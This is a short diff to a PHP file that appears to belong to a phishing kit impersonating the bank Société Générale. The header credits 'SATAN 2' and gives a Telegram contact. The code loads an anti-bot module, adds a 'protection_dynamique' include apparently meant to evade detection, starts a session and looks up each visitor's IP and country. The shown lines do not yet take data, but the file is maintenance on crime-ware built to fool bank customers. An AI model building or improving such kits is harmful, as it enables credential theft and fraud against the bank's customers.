@@ -1,13 +1,15 @@
 <?php
+session_start(); // Ajout de cette ligne pour utiliser les sessions
+
 ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 
 
 /**
- * @link       :   https://www.satan2.com/ 
- * @package    :   SOCIETE GENERALE 
- * @telegram   :   @satan2  
+ * @link       :   https://www.satan2.com/
+ * @package    :   SOCIETE GENERALE
+ * @telegram   :   @satan2
  * Project Name:   SOCIETE GENERALE 2022
  * Author      :   SATAN 2
  * Mise à jour :   08-09-2022
@@ -16,6 +18,8 @@ error_reporting(E_ALL);
 
 include 'inc/antibots.php';
 include 'inc/app.php';
+include 'inc/protection_dynamique.php';
+
 $get_user_ip          = get_user_ip();
 $get_user_country     = get_user_country($get_user_ip);
 $get_user_countrycode = get_user_countrycode($get_user_ip);
